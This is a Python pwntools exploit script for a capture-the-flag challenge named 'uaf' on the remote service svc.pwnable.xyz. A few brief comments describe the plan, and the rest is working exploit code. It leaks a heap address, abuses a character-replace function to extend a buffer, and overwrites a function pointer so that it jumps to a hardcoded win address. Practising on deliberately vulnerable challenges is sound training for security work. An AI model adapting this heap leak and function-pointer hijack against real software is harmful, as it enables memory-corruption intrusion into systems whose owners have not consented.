###in constructor, free hook is overwritten by handler that does nothing
###Thus free is basically useless(such monstrosity for a problem called uaf)
###hijack function pointer to call win func

from pwn import *

###Util
def play():
    r.sendlineafter('> ','1')

def save(data):
    r.sendlineafter('> ','2')
    r.sendafter('name: ',data)

def delete(idx):
    r.sendlineafter('> ','3')
    r.sendafter('Save #: ',str(idx))

def show():
    r.sendlineafter('> ','4')
    return r.recvline()[11:-1]

def edit(victim,target):
    r.sendlineafter('> ','5')
    r.sendlineafter('replace: ',victim)
    r.sendlineafter('char: ',target)

###Addr
win = 0x400cf3
play_f = 0x400d68

###Exploit
r = remote('svc.pwnable.xyz',30015)
r.sendafter('Name: ','M30W')

###Leak heap addr
save('a'*0x80)
heap = list(show()[0x80:])

###Extend buffer size with strchrnull
cand = b'\x00'
for i in range(1,256):
    if i not in heap:
        cand = p8(i)
        break
for i in range(8-len(heap)):
    edit(cand,p8(heap[0]))

###hijack func_ptr with strchrnull
edit(b'\x6b',b'\xf3')
edit(b'\x0d',b'\x0c')

###get flag
play()

r.interactive()
